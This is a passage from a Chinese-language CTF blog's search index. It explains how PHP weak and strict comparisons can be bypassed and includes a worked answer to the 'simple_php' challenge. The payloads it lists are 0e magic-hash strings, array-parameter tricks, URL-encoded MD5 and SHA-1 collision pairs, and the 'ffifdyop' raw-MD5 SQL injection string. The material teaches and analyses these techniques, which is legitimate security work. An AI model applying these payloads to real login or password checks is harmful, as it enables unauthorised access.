12==12 // true12==12aa //trueadmin==0 //truefalse == == 0 == NULL //true 2.布尔值true和任意字符串都弱相等。例如: true==wells //true 3.数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；\t0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0； 绕过MD5验证弱类型比较0e绕过原理：若使用PHP的弱比较时，0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0 例： md5(QNKCDZO) == md5(240610708) MD5加密后得到 0e830400451993494058024219903391 == 0e462097431906509019562988736854 //即0==0，为true 常用MD5加密后为0e的字符串QNKCDZObyGcYsonZ7yaabg7XSsaabC9RqSs878926199as155964671as214587387as1091221200a 强类型比较数组绕过原理：MD5无法加密数组，使用数组虽然会报错，返回了null，nullnull 使用方法 a[]=ab[]=b 强类型绕过（MD5碰撞）原理：使用两个数值不同但MD5值相同的字符串（以下字符串经过URL编码） --------------------c=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 d=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2--------------------param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2------------------- Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2-------------------- --------------------$s1 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab$s2 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab$s3 = %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab-------------------- 拓:sha1加密的两个相同值array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 MD5-SQL注入题目类似于 ?phpsql=select * from admin where password=.md5($pass,true).;? 一个ticker：字符串：ffifdyop的md值为 or6�]��!r,��b\u001c 拼凑到sql语句中变成了 select * from admin where password=or6�]��!r,��b\u001c 由于非空字符串认为真，所有实现了sql注入 实战1.攻防世界-simple_php?phpshow_source(__FILE__);include(config.php);$a=@$_GET[a];$b=@$_GET[b];if($a==0 and $a) echo $flag1;if(is_numeric($b)) exit();if($b1234) echo $flag2;? 此处使用任意开头不含数字的字符串可使a的相关条件通过。 第一个条件：由于a是弱比较，此时任意开头不含数字的字符串被当成0进行比价 第二个条件：a不为空（非空字符串），则条件为真。如果a 是一个空字符串，条件将为假。 此处使用开头含数字且数字大于1234的字符串可使b的相关条件通过。 第一个条件：要求b不能是一个数字或者是全由数字构成的字符串 第二个条件：此时进行若比较，开头含数字且数字大于1234的字符串会被作为数字进行比较","tags":["CTF-Web","Web-PHP"],"categories":["web"]},{"title":"关于","path":"/about/index.html","content":"About Me Hi，I'm Wells. CTFer 网络安全小白 懒且宅 喜欢探索新知识新领域 热衷于将问题刨根问底地研究下去 经常三分钟热度地开一篇新文章，但写着写着就咕咕哒了 励志成为糕手，期待和各位师傅共同进步 About Blog 本站使用 Hexo框架 与 Stellar 主题创建，使用 Github action 自动化构建和 Github Pages 托管。 本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议，转载请注明出处。"},{"title":"友链","path":"/friends/index.html","content":"大佬们 如何交换友链 新建 GitHub Issue 按照模板格式填写并提交 更新友链信息 如果您需要更新自己的友链信息，请直接修改 GitHub Issue 内容 , 修改完成后将会在三分钟内自动完成更新。如果无法修改，可以在此页面留言。"}]